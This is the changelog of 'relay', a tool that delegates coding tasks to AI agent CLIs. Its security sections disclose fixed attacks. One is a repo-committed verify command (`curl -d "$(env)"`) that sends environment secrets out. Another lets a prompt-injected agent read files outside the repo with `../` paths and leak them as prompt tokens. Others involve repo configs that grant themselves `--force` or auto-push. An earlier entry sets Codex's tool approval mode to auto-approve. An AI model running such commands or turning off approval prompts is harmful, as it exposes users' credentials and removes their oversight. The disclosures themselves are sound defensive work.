# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **k2.6, k2.7-code (+ a `fast` highspeed entry), and k3 are in the catalog, k3's effort
  levels work per tier, and the kimi adapter is flag-verified.** There is no `--effort`
  flag, so a tier's `effort:` now spawns the CLI with `KIMI_MODEL_THINKING_EFFORT` — k3
  takes low/high/max (default high); on boolean-thinking models (k2.6, k2.7-code) any
  value just means thinking on. The default router gains kimi fallbacks in every tier but
  nano — a kimi-only machine routed nothing before. k3 lands in opus-class provisionally:
  every published number is vendor-only, the same evidence rule that demoted k2.7-code
  from frontier. k2.7-code's price was re-verified against models.dev (0.95/4.0, cache
  0.19 — was 1.0/4.0 flat) and now supersedes k2.6 (same rate card, newer,
  code-specialized)

### Fixed

- **The kimi backend passed catalog ids verbatim to `kimi --model`, which resolved to
  nothing under `kimi login`.** The managed OAuth service serves `kimi-code/*` aliases
  (`kimi-code/k3`, `kimi-code/kimi-for-coding`), not the open-platform ids the catalog
  names — so every kimi-routed run failed on the default auth path. A pinned `kimiModelId`
  map now translates catalog ids (verified against kimi-code 0.29.1); k2.6, which the
  managed service does not serve, still passes through so users pin their own provider
  alias (e.g. `moonshotai/kimi-k2.6`)

## [0.12.2] — 2026-07-25

### Fixed

- **`relay uninstall` no longer leaves a registration behind in Claude Code.** Found by doing a
  full wipe-and-reinstall on a real machine and then checking the result rather than trusting
  the command's own ✓s: uninstall reported a clean sweep while
  `~/.claude.json` still carried `projects["…/relay"].mcpServers.relay`. Two gaps lined up —
  `claude mcp remove -s user` only knows user scope, and relay's own JSON fallback only looked
  at the top-level `mcpServers` *and* was skipped entirely whenever the CLI call succeeded. A
  surviving entry is worse than an untouched one, because it outlives the binary: that project
  then opens with a relay server it can no longer spawn. Relay now sweeps project scope in the
  same file, and does it even when the CLI path reports success
- **`src/uninstall.ts` was still reading `os.homedir()`**, the same untestable call v0.12.1
  removed everywhere else — so uninstall ignored `$HOME` and couldn't be exercised against a
  temp home

## [0.12.1] — 2026-07-25

### Fixed

- **Relay honors `$HOME` now, and the suites stop writing to the developer's dotfiles.** Bun's
  `os.homedir()` reads the passwd entry and ignores `$HOME` outright, which made the new
  startup hint-refresh rewrite the developer's real `~/.cursor/rules/relay.mdc` from inside
  `bun test` and `bun run evals` — caught within minutes of shipping v0.12.0, by noticing the
  file's mtime matched an eval run rather than the upgrade. Same class of leak the test
  preload's XDG overrides already existed to prevent, so the fix matches: a `userHome()`
  helper that prefers `$HOME` (which is also what containers and multi-account setups expect),
  plus `HOME` isolation in the test preload and the eval harness. Config and data dirs resolve
  through it too, so an isolated `HOME` isolates all of relay

## [0.12.0] — 2026-07-25

### Added

- **Relay notices when it's the stale one.** Hosts spawn `relay mcp serve` once per session and
  keep the process for hours, so `brew upgrade relay` leaves the agent talking to the old code
  with nothing in the protocol to say so — found the honest way, by shipping v0.11.0 and then
  watching this session keep using v0.10.0's behavior. `relay_doctor` had only *advisory prose*
  telling the reader to compare versions themselves; relay does the comparison now. Every
  `relay_run`, `relay_status`, and `relay_doctor` result carries a `stale_server` line when the
  binary on PATH is newer than the process serving the call, telling the agent to have the user
  reload. Results are the right channel precisely because tool *descriptions* are cached by the
  client for the life of a session — that caching is what hid the problem. Cost is one `stat`
  per call: the binary's mtime gates whether relay bothers to probe at all, and only the probe
  is cached (caching the quiet answer would have hidden an upgrade for the whole TTL — the eval
  scenario caught that). One-directional on purpose: running ahead of what's installed is
  development, not staleness
- **Host activation hints refresh themselves after an upgrade.** `src/activation.ts` has always
  been able to rewrite its fenced block in place — the code comment says "so wording updates
  ship with new versions" — but `installActivationHints` was only ever called by `relay setup`,
  so an upgraded relay kept instructing every host with whatever text was current the last time
  the user ran setup. `relay mcp serve` (which every host starts, making it the one thing that
  reliably runs after an upgrade) and `relay update` now bring existing blocks up to date. It
  only rewrites files that already carry relay's block: an upgrade must never install relay into
  a host the user didn't set up, or resurrect hints they deliberately removed. Content-based
  rather than version-stamped, so it self-heals and no-ops when current
- **The hint files now teach parallel delegation**, which is what makes the refresh worth having
  today: agents learn to fan out independent tasks from `~/.cursor/rules/relay.mdc`,
  `~/.claude/CLAUDE.md`, and `~/.codex/AGENTS.md` — read fresh every session, no MCP cache in
  the way

### Fixed

- **`Bun.which` and `os.homedir()` were quietly untestable.** `Bun.which` answers from the PATH
  the process launched with and ignores later `process.env.PATH` changes; Bun's `os.homedir()`
  ignores `$HOME` entirely. Staleness detection walks PATH itself now, and the activation
  refresh takes the home directory as an argument — otherwise both were only verifiable by
  writing to the developer's own dotfiles

## [0.11.0] — 2026-07-25

### Added

- **Independent tasks can now run in parallel in one repo.** A host agent with a list of
  unrelated tickets could only feed them to relay one at a time: the write lock was taken on
  the *repo*, and taken before the worktree was created, so a second walkaway run was refused
  even though it was about to work in a tree of its own. The lock was protecting the right
  thing (two runs in one working tree really do fail each other's verify — that's why it
  exists) but keyed too coarsely, and it turned "fan out four briefs, review four branches"
  into a serial queue. Now the working tree stays exclusive while the repo is merely capped:
  `max_parallel` in the directive (default 2) bounds how many writing runs a repo hosts at
  once, worktree lanes overlap up to it, and tree-editing lanes are unchanged. Deliberately
  three separate guards rather than one lock, because there are three shared things:
  - the working tree — exclusive, keyed by the tree's own path, so linked worktrees of one
    repo don't block each other while two runs in *one* tree still can't happen
  - the repo — a counted cap, keyed by the shared git dir (every worktree of a repo agrees on
    it, no two clones share it). Over the cap, a run is refused before spending anything, and
    the refusal names the run ids to poll and the knob that raises it
  - the repo's verify commands — serialized, because isolated trees do **not** isolate a test
    suite that binds a port, touches a dev database, or shares fixtures. A verify that fails
    for contention reads as the model's fault and buys a real escalation to a frontier model,
    so parallelism buys you concurrent *generation* (the slow phase) and an orderly queue at
    verify. Runs report a `verify_queued` phase while they wait
  Creating a worktree also takes a brief repo-wide turn now, since it writes shared git state.
  No new API: N `relay_run` calls with `wait: false` on a worktree lane is the whole interface,
  and the tool description says so — an agent reading it shouldn't have to infer that isolated
  worktrees imply parallelism, which is exactly the inference that was wrong before. Covered by
  `tests/parallel.test.ts` and eval scenario 16 (three concurrent live delegations → three
  branches). `bun run evals --only <substring>` runs a single scenario now, since iterating on
  one scenario shouldn't cost a whole suite; a filtered run deliberately leaves `report.md` alone
- **The eval suite now covers the permission posture — 18/18 (was 14/14).** The suite that
  exercises the real MCP surface and live host delegation hadn't run since before v0.9.0, so
  the whole safe-by-default effort was verified only by unit tests. Four scenarios close that:
  a repo-committed directive is refused `worktree` and `autonomy: full`; the identical
  directive placed in the *user's* config is honored (the security fix must not quietly become
  a functional regression, and this is the test that would catch it); a repo-authored verify
  command is refused before any tokens are spent, with the command shown; and a read-only lane
  declines an explicit instruction to create a file — flag enforcement, not prompt compliance.
  `RelayMcp.spawn` takes a `configDir` now, which is what makes the repo-vs-user contrast
  testable at all

### Fixed

- **Host eval scenarios reported a successful delegation as "host never called relay."** Two
  latent bugs in the harness, both found by hitting them: the run-record lookup consulted only
  the ambient `XDG_DATA_HOME`, so a runner with one set never checked the default location
  where env-scrubbing hosts (cursor, codex) actually write; and `XDG_CONFIG_HOME` leaked from
  the runner's shell into the host CLIs that *do* propagate env (claude), silently rewriting
  their routing and verify commands. A leftover sandbox config in a developer's shell
  therefore produced three failures that looked like product regressions and weren't. The
  harness now checks both record locations and drops `XDG_CONFIG_HOME` for host children;
  verified by re-running the suite under the exact polluted environment that broke it

### Added

- **The site now answers "what can this do to my machine?"** The trust section covered privacy —
  no telemetry, no stored credentials, pull-only updates — but said nothing about blast radius,
  which is the question anyone vetting relay for a work machine actually asks. It now also states
  the permission posture: sandboxed commands with no `--force` unless your own config opts in,
  repo-supplied permission grants clamped, repo-authored verify commands gated behind
  `relay trust`, and the honest limit that a worker still reads the repo's AGENTS.md
- **A real contribution pathway.** The repo was public and Apache-2.0 — so PRs already
  worked — but nothing told anyone that, and there was nothing to pick up. Now: `SECURITY.md`
  with private vulnerability reporting (the first real security report arrived as a DM
  because there was no documented channel), a `CODE_OF_CONDUCT.md`, issue templates
  (bug/feature/catalog) and a PR template whose checklist is just this project's existing
  ground rules made visible, a fork-and-PR walkthrough plus a "good first contributions"
  section in `CONTRIBUTING.md`, and five open issues labelled for newcomers. The
  `SECURITY.md` scope section deliberately names the *non*-vulnerabilities too — a worker
  reading a repo's AGENTS.md, an approved verify command running, `autonomy: full` doing what
  it says — so a reporter isn't guessing where the design boundary is

### Fixed

- **A dry run now names the grants it refused a repo-committed directive.** Real runs emit
  `autonomy_clamped` / `write_clamped`, but `--dry-run` returns before that and printed only the
  clamped result — so the one command you'd use to audit what a cloned repo's `router.yaml`
  actually does showed `write: tree` with no hint the repo had asked for `worktree`
- **`scripts/check-catalog.ts` now runs on pull requests.** Catalog edits are the
  contribution this project actively advertises as easiest, but the checker that validates
  them only ran nightly and on pushes to `main` — a path no fork PR ever reaches. A
  contributor's catalog PR could go green while the embedded mirror or the `updated:` date
  was out of sync
- **`relay uninstall` no longer reflows the rest of `~/.claude/CLAUDE.md`.** Removing the
  activation block collapsed every blank-line run in the whole file, silently reformatting
  content relay doesn't own. That file is shared ground — lean-ctx maintains a `<!-- lean-ctx -->`
  block in it, and other context tools do the same — so whitespace is now normalized only at
  the seam where relay's own block was. Guarded by a coexistence test using lean-ctx's real
  markers: installing leaves a neighbor's block byte-for-byte, uninstalling restores the file
  exactly. Prompted by a beta tester asking whether the two conflict; they don't, but this is
  the one place they would have

## [0.10.0] — 2026-07-24

### Security

The external review that produced 0.9.0 also produced a full findings register — 0.9.0 and
0.9.1 answered the three findings summarized to us, not the register. The reviewer named the
root cause better than we had: *relay never separates instructions the user gave it from files
it found in the directory the user happened to be in.* Most of what follows is that one
boundary, drawn properly, plus the sinks that leak across it.

- **Your own config now outranks a repo's.** `~/.config/relay/router.yaml` resolves before
  `./router.yaml` and `./.relay/router.yaml`. A directive is not a preference file: it decides
  which vendor runs, how much of your repo ships to it, whether edits land in your working tree
  or an auto-pushed branch, and which verify commands execute. Whoever commits to a repo you
  cloned had all of that, and your own config was the thing being ignored. Repo-local files
  still govern users who have no config of their own, which is the case they were for.
  `relay init` no longer writes a repo-local copy at all — it wrote one *and* ranked it above
  the user copy it wrote in the same breath, so relay's own setup command built the footgun
- **`write: worktree` joins `autonomy: full` as a grant a repo cannot make.** The worktree path
  branches, commits, pushes with your ambient git credentials and opens a PR with `gh`.
  `src/git.ts` calls that push "consent-implied by choosing a walkaway lane" — consent only you
  can give. Clamped to `tree` for repo-sourced directives, and the run says so (`write_clamped`)
- **An unmatched task could reach the auto-push path with no opt-in.** Walkaway lanes were
  strictly opt-in inside the routing loop, but the `default_lane` fallback — the branch every
  task with no confident verb match takes — skipped the check entirely. A repo-set `default_lane`
  pointing at a walkaway lane meant *every* relay run in that repo branched, committed, pushed
  and opened a PR. The fallback now applies the same check and keeps edits in the working tree.
  Relatedly, the word "walkaway" appearing anywhere in the task text no longer opts in: over MCP
  that text is written by another agent, so prose could reach a lane that spends your credentials
- **Named files can't escape the repo.** `brief.files` was joined onto `cwd` with no containment
  check, and `join` neutralizes a leading `/` but not `../`. File contents go into the prompt and
  ship to a third-party model, so an MCP caller — another agent, possibly prompt-injected — could
  turn "add context" into "read any file this user can read, then exfiltrate it as prompt tokens."
  Reproduced by the reviewer; now resolved and rejected if it leaves `cwd`
- **Secrets are scrubbed from anything relay persists or hands back.** Backend CLIs print what
  they print, including auth errors that echo the key. That output was written verbatim into
  `events/<run_id>.jsonl` on failure and returned as `outputTail` on every MCP run, where the
  calling agent stores it in its own transcript. Both sinks now go through `redactSecrets`
  (vendor key formats, PATs, JWTs, bearer tokens, PEM blocks, `*_TOKEN=`-style assignments).
  Defense in depth, not a guarantee — pattern matching can't recognize every credential, which
  is why it doesn't license capturing more
- **Device codes stay in your terminal.** A failed `relay_login` over MCP returned the login
  command's last lines to the calling agent — where one-time sign-in URLs and device codes live.
  That tail is now CLI-only; over MCP relay says to run `relay login <tool>` in a terminal
- **Third-party binaries don't get your credentials.** `bd` (beads) inherited the full
  environment, `ANTHROPIC_API_KEY` and `GITHUB_TOKEN` included. It gets the same allowlisted
  environment verify commands got in 0.9.0, now one shared definition (`toolEnv`)
- **A fetched catalog can no longer pin itself in place.** `relay update` pulls from a branch and
  the file declares its own freshness, so `updated: 9999-01-01` would outrank every future
  embedded catalog and survive upgrades — falsifying receipts and steering `relay advise`. A
  catalog dated in the future is treated as tampering. (Deliberately still pulling from `main`:
  catalog-as-data is what lets price fixes ship without a release)
- **`relay status <id>` can't read outside the events dir**, and the release workflow no longer
  interpolates `workflow_dispatch` inputs into a shell — that ran in the job holding the tap
  deploy key, and the same string was written verbatim into the formula's Ruby. Inputs arrive via
  `env` and must match `x.y.z` or the release stops. Releases now publish `SHA256SUMS`

### Fixed

- `relay setup` rewrites `~/.claude/CLAUDE.md` and `~/.codex/AGENTS.md` atomically and keeps a
  `.relay-bak`. It spliced them in place with no backup, so a crash, a full disk or two
  concurrent setups could truncate years of accumulated instructions — and other tools manage
  those same files, which is what makes recoverability matter rather than being paranoia

### Documentation

- Honest limits now state two things the register was right to call out as undocumented rather
  than unsafe: `verify: auto` runs repo-authored code (`npm test`, `make lint`) as a side effect
  of asking relay to fix something, and `doctor`/`setup`/`login` make real, billed one-token
  model calls to confirm auth

## [0.9.1] — 2026-07-24

### Security

- **A cloned repo could re-enable `--force` on itself.** 0.9.0 made unattended command
  execution an explicit opt-in (`autonomy: full`), but read the value from whichever directive
  won resolution — and a repo-local `router.yaml` / `.relay/router.yaml` outranks the user's
  config. So a repo could ship a lane with `autonomy: full` and get exactly the
  skip-all-permissions posture the release had just removed, with no consent from the person
  running relay. The trust gate shipped alongside it guarded repo-supplied *verify commands*
  against the same trick, which is what makes this an oversight rather than a judgement call.
  Repo-local directives are now clamped to `autonomy: safe`, the run says so when it happens,
  and opting in means writing it in your own config where nobody else can commit to it.
  Repo-locality is now one shared predicate (`directiveIsRepoLocal`) used by both the verify
  gate and the clamp, because a security check that exists in two copies is one that drifts

## [0.9.0] — 2026-07-24

### Security

An external review of a fresh install flagged three things before wider rollout; all three were
real. The common thread: relay inherited each host CLI's most permissive headless posture and
the OS's most permissive file defaults, and neither was a decision anyone had actually made.

- **Cursor workers no longer get `--force` by default.** Empirically (verified against
  cursor-agent 2026-07, which its docs understate): headless print mode auto-runs edits *and*
  sandboxed shell commands even without `--force`, so flags — not approval prompts — are the only
  real enforcement. Read-only lanes now pass `--mode ask`, the one mode that actually refuses
  writes (this also closes a live violation of our own "read-only lanes must be read-only in the
  backend flags" invariant). Write lanes get `--sandbox enabled` and never `--force` unless the
  lane sets `autonomy: full` in router.yaml — unattended command execution is now a posture the
  user writes down, not one relay assumes. Flags are feature-detected per the drift rule; older
  CLIs degrade to plain `--trust`. Claude workers were already on `acceptEdits` and are unchanged
- **Repo-committed verify commands need a one-time `relay trust` per repo.** A repo could commit
  `.relay.yaml` (or a repo-local `router.yaml`) with `lint: curl -d "$(env)" …` and relay would
  run it as the user on the first delegated task — arbitrary code chosen by whoever committed it,
  executed automatically. Runs now fail fast (before any tokens are spent) showing the exact
  command, until `relay trust --yes` approves it — hash-pinned, so approval dies with any edit to
  the command. Conventional detected commands (`npm run lint`, `pytest`) stay ungated: they're
  the same exposure as running the repo's toolchain yourself. Verify commands also run with an
  allowlisted environment now (PATH/HOME/locale + CI=1), so even an approved command can't read
  the caller's API keys out of the environment
- **The data dir is owner-only.** Run history, memory notes, and (with `--log-tasks`) task text
  sat world-readable under the default umask on shared machines. Files are created `0600` in
  dirs created `0700`, and startup tightens anything older relays left behind

### Fixed

- **Backend timeout was wall-clock, killing legitimately long tasks mid-work.** A beta
  tester's run died at exactly 10 minutes while the CLI was still streaming progress.
  `RELAY_BACKEND_TIMEOUT_MS` (default 10 min) now measures **inactivity** — silence since
  the last stdout/stderr chunk — so hung CLIs waiting on auth/network still fail over,
  but a working backend that keeps producing output is not cut off
- **A flag written after the task was silently swallowed into the task text**, which made
  `relay "…" --dry-run` spend real money on a real run — the one flag whose whole job is to
  spend none. The parser consumed the rest of argv as soon as it saw two non-flag tokens in a
  row, so `--dry-run`, `--lane`, `--tier`, `--walkaway` and `--log-tasks` all became part of the
  goal the model read. Flags are now recognized wherever they appear, and an unrecognized one
  fails loudly instead of quietly becoming prompt text. `relay run "…"` also works now: `run`
  is accepted as the implicit verb rather than prepended to the goal. Guarded by
  `tests/cli_args.test.ts`, which can exist because the entrypoint is behind `import.meta.main`
- **A background run whose controller died reported "working" forever**
  ([#4](https://github.com/yoreai/relay/issues/4)). Runs are driven
  in-process, so when the MCP server restarts mid-run the run dies with it — but its last record
  says `running`, and `relay_status` served that unchanged indefinitely. An agent polling every
  30s could not distinguish "still thinking" from "gone", which is the worst possible answer for
  the `wait: false` path we tell agents to prefer. Records now carry the controller's pid, and
  any `running` record whose controller is gone reads back as `interrupted` with the reason.
  Reconciled on read, so pollers never race each other rewriting history, and a merely-slow
  controller is never mislabeled; pre-0.9.0 records without a pid fall back to age. Abandoned
  runs are also excluded from `relay advise`'s per-model success stats — the controller died,
  not the model, and counting it would quietly argue against a model that did nothing wrong
- **`runCli` could hang forever on a backend that had already exited.** Backend CLIs leave
  helpers behind (cursor-agent keeps a `worker-server`) which inherit the stdout/stderr pipes,
  so waiting for the streams to close waited on the orphan rather than the run — a killed
  backend could still stall its own timeout. Reading now stops 2s after the child exits and
  says so, rather than trading a wall-clock timeout for an unbounded wait

## [0.8.4] — 2026-07-24

### Changed

- **composer-2.5 now leads the `cheap`, `work` and `fast` tiers**, with glm-5.2 one line below it
  as the fallback. A fresh install used to greet the user with three `relay advise` suggestions
  telling them their brand-new config was ~27% overpriced — if advise would immediately propose a
  swap, the default should have been the swap. The evidence is independent rather than vendor-only:
  composer-2.5 is third on Artificial Analysis's Coding Agent Index (62) behind only opus-4.7-max
  and gpt-5.5-xhigh, which cost ~10–60× more per task, and it ties opus-4.7 on Terminal-Bench v2.
  Recorded in the catalog with the caveat that gpt-5.5 still beats it by ~13pp on shell-heavy work
- **The default `baseline` is opus-5, not fable-5-high.** Savings were being measured against a
  model relay itself would never choose — its own `deep` tier escalates to opus-5, at half
  fable-5's price. Comparing against the pricier model inflated every receipt by roughly 2×.
  Reported savings drop accordingly and are now defensible

### Added

- A test that the **shipped defaults are advise-clean** — on any single backend and on all of
  them — so a default can never again ship in a state advise would immediately argue with
- Re-ran the bench on the current defaults: **6/6 quality parity, 5.1× median cost ratio**
  (4.9–8.8×), all 12 runs priced from measured tokens. The headline barely moved from the old
  5.2× despite the comparison arm getting ~2× cheaper. Speed is now stated honestly at 1.7×
  median rather than "3–6×", which was an artifact of frontier runs stalling in the old run

### Fixed

- **The bench measured whoever ran it.** It read the local `router.yaml`, so published numbers
  silently described one machine's policy — and a `relay advise --apply` midway through a run
  genuinely produced results that were half one model and half another. Each fixture now pins the
  shipped starter policy, and the summary records which directive it used
- The bench's stored note still claimed cursor costs were byte-estimated, which stopped being true
  when measured token reporting landed. It now counts measured vs estimated runs from the results

## [0.8.3] — 2026-07-24

### Added

- **`relay_doctor` over MCP now returns the whole picture, not just auth.** It reported tool
  sign-in state and nothing else, so an agent-run doctor — how most people will ever run it —
  could not see that a tier was routing to a superseded model, that the catalog was stale, or
  that a local `prices.yaml` was freezing receipts. It now includes relay's version, where every
  tier actually lands on this machine, catalog freshness, and warnings, and the tool description
  tells the agent to report routing and warnings rather than just tools
- Both doctors now print relay's **version** — the MCP one labels it as the version *serving the
  call*, which is the only way to tell that an agent session is holding a stale server process
  after an upgrade

## [0.8.2] — 2026-07-24

### Fixed

- **Receipts were priced off a frozen copy of the price table.** Prices live in the catalog so
  `relay update` can correct them without a release — but `EMBEDDED_PRICES_YAML` *also* listed
  nine models, and a `prices.yaml` entry overrides the catalog by design. Worse, `relay init`
  wrote that list to `~/.config/relay/prices.yaml`, where nothing could ever correct it: anyone
  who ran `init` had those prices pinned for good. The embedded file now lists no models,
  `relay init` writes no prices file, and `relay doctor` warns when an existing one shadows the
  catalog. Same bug family as the two shipped in 0.8.0 — a second source of truth nobody
  remembers to update
- Deleted `defaults/prices.yaml`, which no code path ever read. It duplicated catalog prices, so
  its only real function was to drift

### Removed

- **`PLAN.md`.** It was an internal design memo — "open questions for the owner", "do not
  relitigate without the owner" — that also named this project's relationship to an employer's
  internal tools, which this repo's own rules say to keep out. Now that people are reading the
  repo, the parts worth keeping went where they're actually useful: design rules and invariants
  into `AGENTS.md`, honest caveats into a new **Honest limits** section in `README.md`, and
  rationale into these changelog entries. Unbuilt ideas belong in issues, where they can be
  discussed and closed
- `docs/design/context-hygiene.md`, added earlier the same day. It described four capabilities
  that don't exist and pointed at a prototype directory only present on one machine — a
  false roadmap for anyone arriving from the announcement

## [0.8.1] — 2026-07-24

### Added

- `relay savings --json` — the full summary as JSON for scripting, instead of parsing the
  human table
- `relay remember`'s `--kind` flag is now shown in `--help` and the README. It always worked;
  nothing advertised it

### Fixed

- **`relay uninstall`'s own docs undersold it** — it deregisters the Claude *desktop app* as
  well as the CLI, and `--purge` deletes per-repo memory. Both now said out loud, since
  "where does my memory live" deserves a straight answer
- Removing a walkaway worktree left an empty `.relay/worktrees/relay/` behind, which reads as
  a stray "relay inside relay" folder. `createWorktree` now prunes dead registrations and
  sweeps the empty scaffold (including `.relay` itself) before it adds anything
- Two probe tests asserted against the *real* installed CLIs on bun's default 5s timeout, so
  the suite went red on any machine where an auth check was slow — a first-contribution
  papercut. They now count spawns against fake binaries and finish in ~0.5s instead of timing
  out at 5s

### Documentation

- `docs/design/` is now an acknowledged place for long-form *explorations*, distinct from
  `PLAN.md`'s locked decisions — with the rule that each one states what has since shipped and
  what was deferred, so nobody mistakes an option for a roadmap. First resident: the
  context-hygiene analysis that memory came out of
- Site: dedicated **cross-agent memory** section (real `relay recall` digest shape, the
  repo-not-tool keying, the day-one git layer), memory in the hero lede and nav, and the origin
  story plus motivation in `about`
- `README.md`: memory promoted into the opening pitch; "relay remembers" → "Cross-agent memory",
  spelling out that the store is keyed to the git root so Cursor / Claude Code / Codex share it
- `AGENTS.md`: memory + catalog + activation modules in the architecture reference, an
  "invariants that cost us a bug once" section (pinned model ids, catalog date precedence,
  read-only lane flags, worker recursion), and `supersedes:` added to the catalog ritual
- `PLAN.md`: refreshed the stale parts — cursor usage is measured now (not byte-estimated), the
  receipt example matches current output, the rejected `bd`/beads context source is marked as
  such, and the model-id pinning rule plus the "tiers are the latest-model abstraction" decision
  are recorded

## [0.8.0] — 2026-07-24

### Added

- **opus-5** in the catalog as `frontier` class, and leading the `review` and `deep` tiers of the default directive. Within 0.5pp of fable-5 on CursorBench 3.2 at max effort for ~half the cost per task, 3x the next-best on ARC-AGI-3, and clears fable-5's OSWorld 2.0 peak on ~1/3 the budget — all on opus-4.8's unchanged $5/$25 rate card
- Catalog models can declare `supersedes: [id]`. `relay advise` now flags a superseded pick **even when the successor saves nothing**, which the cheaper-model rule structurally could not: opus-5 costs exactly what opus-4.8 costs, so price-only advice stayed silent about a strictly better model. This is how new models reach people who already have a directive — catalog data ships without a release, and relay still never edits your policy for you

### Changed

- **`kimi-k2.7-code` reclassed `frontier` → `workhorse`.** As the cheapest model in the frontier class it was what `advise` recommended to replace fable-5 in the `deep` tier — a ~91% "saving" across a two-tier quality drop. The class never held up: every published K2.7 number comes from Moonshot's own proprietary suites (no independent SWE-bench, Terminal-Bench or LiveCodeBench results exist), and on Moonshot's own table it trails opus-4.8 — relay's opus-class marker — on Kimi Code Bench v2, Program Bench and MCP Atlas. `advise` now sends deep-tier users to opus-5 (~50% cheaper, genuinely same class) instead. Revisit if audited public-suite numbers land

### Fixed

- **The claude backend ran a different model than it billed.** `fable-5-high` mapped to the floating CLI alias `opus`, so deep-tier runs on claude executed Opus while pricing Fable; `opus-4.8-high` mapped to `opus` too, which silently became Opus 5 the day it shipped. All claude ids are now pinned full names (`claude-opus-5`, `claude-fable-5`, …) — relay runs the model the receipt is priced against, or fails loudly. Note: the claude API gates `claude-fable-5` behind data retention, so it 400s on ZDR workspaces rather than quietly substituting
- **Upgrading the binary could strip prices from its own default models.** `loadCatalog` preferred any `relay update`-fetched catalog over the embedded one, so a newer release whose default directive routed to a new model lost its receipt ("savings unavailable") until the user ran `relay update`. Between fetched and embedded, relay now takes whichever was reviewed most recently; a hand-written user catalog still always wins

## [0.7.2] — 2026-07-24

### Fixed

- `relay recall` listed parked branches as `+ relay/build-x` — git marks worktree-checked-out branches with `+`, which the digest wasn't stripping

## [0.7.1] — 2026-07-24

### Fixed

- Walkaway lanes now actually open the promised draft PR: relay pushes the `relay/*` branch to origin first (gh cannot create a PR for a local-only branch, and headless gh won't push one). Found live-dogfooding the PR flow; relay never pushes non-`relay/*` branches

## [0.7.0] — 2026-07-23

### Added

- **relay remembers** — per-repo memory so new sessions catch up in one call instead of re-explaining (or paying for one giant thread). New MCP tools `relay_recall` (compact digest: recent git activity, relay runs with failed-run "open threads", deposited notes, and recent Cursor/Claude/Codex session asks read best-effort from the hosts' own local files) and `relay_remember` (durable one-line notes: decision/todo/context/watchout). CLI twins: `relay recall`, `relay remember "<note>" [--kind …]`. Notes are keyed by git root; everything is local files; `relay uninstall --purge` deletes it
- Activation hints now teach hosts to call `relay_recall` on "where were we" / session start and to deposit wrap-up notes via `relay_remember`
- Eval scenario: a note deposited in one MCP session is recalled by a fresh server process (the "new thread" case), layered on git history

## [0.6.19] — 2026-07-23

### Added

- `relay setup` now registers relay in the Claude desktop app's `claude_desktop_config.json` when the app is installed, using the absolute binary path (GUI apps don't inherit shell PATH); `relay uninstall` removes it. The Codex app already shares the CLI's `~/.codex/config.toml`, so no change needed there

## [0.6.18] — 2026-07-23

### Changed

- Write lanes no longer auto-stage: edits land in the working tree as ordinary uncommitted changes, exactly like the host agent's own edits. Auto-staging silently changed what the user's next `git commit` contained. `write: stage` in existing directives is accepted as an alias for the new `write: tree`; walkaway/worktree lanes still commit on their `relay/*` branch

## [0.6.17] — 2026-07-23

### Changed

- Activation hint now says to delegate even when the task looks trivial — weaker host models were skimming the rule and doing "relay this: fix the typo…" themselves, silently defeating cost tracking
- Eval suite hardened: host-delegation scenarios accept staged-edit evidence (codex/cursor spawn MCP servers with a scrubbed env, hiding the run log), install the cursor rule at project level (headless CLI skips global IDE rules), use a mainstream host model, and retry once on host-model variance — first fully green 13/13 board

## [0.6.16] — 2026-07-23

### Added

- Per-repo write lock: a second writing run in the same repo is now refused with a pointer to the active run's id instead of silently racing it — overlapping runs in one working tree were failing each other's verify on edits that pass cleanly in isolation. Read-only lanes (status/review) never lock, and locks from crashed processes are reclaimed automatically

### Changed

- Activation hints now tell host agents to start nontrivial relay tasks asynchronously and poll `relay_status`, giving users periodic phase/blocker updates instead of leaving one opaque tool call running for minutes

### Fixed

- `relay login <tool>` / `relay setup`'s sign-in prompt could go silent right when a browser challenge needed attention: cursor-agent's "if your browser didn't open, use this link: …" fallback only surfaced after the 3-minute timeout killed the process, by which point the link was already dead. The login command's stdout/stderr now stream live to stderr as they run, and login commands no longer get tagged `RELAY_WORKER=1` (that tag is for backend work relay dispatches, not for a login the user is driving directly)

## [0.6.15] — 2026-07-23

### Added

- End-to-end eval suite (`bun run evals`, `--hosts` for the host-delegation layer): drives `relay mcp serve` over stdio the way real hosts do across 10 preset scenarios (write lane, read-only, no-op, cwd/recursion guards, brief coercion, fire-and-poll, walkaway, bad directive, tool surface) plus live cursor-agent/claude/codex "relay this:" delegation checks; writes `evals/report.md`

### Fixed

- Codex could never actually call relay: codex gates MCP tool calls behind an approval elicitation that headless `codex exec` auto-cancels ("user cancelled MCP tool call") and interactive mode re-prompts for, and its 60s default tool timeout is shorter than a typical run — codex then quietly did the task itself, so delegation looked fine while relay never ran. `relay setup` now sets `tool_timeout_sec = 900` and `default_tools_approval_mode = "approve"` on the relay server block
- `relay setup --yes` no longer auto-launches interactive browser sign-in flows, which hung forever in scripts and agent-driven setups; it prints the sign-in command instead
- `relay login <tool>` (also `relay_login` and `relay setup`'s sign-in offers) no longer re-probes every installed tool's auth after a sign-in — it was invalidating and live-rechecking cursor, claude, *and* codex on every single-tool login, turning e.g. `relay login codex` into a multi-tool audit with extra model-calling latency. Now only the tool just signed into gets a fresh check; the others keep their cached verdict

### Changed

- README and site no longer claim "no per-agent config"; setup installs a removable delegation hint per host and says so
- Changelog consolidated: entries condensed to the essential user-facing change; anecdotes and site/branding noise removed (no versions, dates, or links altered)

## [0.6.14] — 2026-07-23

### Fixed

- Read-only cursor lanes no longer edit files: `--force` is no longer passed unconditionally for `write: none` lanes, which now get `--trust` only, and every backend prompt gains an explicit READ-ONLY guard
- MCP refuses to run when the host omits `cwd` instead of silently running from the MCP server's own working directory; it errors and asks the host to retry with `cwd`

## [0.6.13] — 2026-07-23

### Fixed

- Cursor savings were inflated ~10x: output tokens are now read from cursor-agent's result event instead of byte-estimated from the stream-json transcript; cursor and claude receipts are now `[measured]`

### Changed

- Cache-read tokens are now priced into both sides of the receipt, at the catalog `cache_read` rate or 10% of input price when unlisted
- Receipt wording makes the counterfactual explicit (`~$0.37 saved — glm-5.2 cost $0.05, baseline fable-5-high would've cost ~$0.42 [measured]`); says "no savings" instead of `$0.00 saved` when the baseline is cheaper

## [0.6.12] — 2026-07-23

### Added

- `relay setup` installs activation hints per host (Cursor rule, fenced blocks in `~/.claude/CLAUDE.md` and `~/.codex/AGENTS.md`) so hosts delegate on "relay this: …"; `relay uninstall` strips exactly the fenced block. The hint carries the RELAY_WORKER guard

### Changed

